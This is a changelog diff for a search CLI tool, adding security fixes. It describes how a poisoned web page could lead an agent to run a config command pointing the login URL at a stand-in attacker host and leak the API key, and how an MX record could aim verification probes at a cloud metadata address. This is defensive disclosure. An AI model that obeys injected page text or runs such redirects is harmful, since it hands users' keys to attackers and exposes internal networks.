@@ -20,6 +20,18 @@
 Search dispatch is unchanged: this release stores credentials, it does not yet
 route queries through metasearch.sh.
 
+### Security
+- `search login` now refuses to send credentials anywhere but
+  `https://metasearch.sh`. An agent reading a poisoned web page could
+  previously run `search config set metasearch.url https://attacker.tld` (or
+  pass `--url`) and the next login would hand the API key to whoever asked.
+  Self-hosted instances set `METASEARCH_ALLOW_INSECURE_HOST=1` to consent;
+  plain http is refused outright except on loopback.
+- `search verify` applies the same default-deny network guard as
+  extract/scrape. An MX record is attacker-controlled: a hostile domain could
+  point it at `169.254.169.254` or a LAN address and read what is listening
+  off the SMTP response codes.
+
 ## 0.8.0 — 2026-07-02
 
 Production-hardening release from a full blindspot audit (cross-checked by an
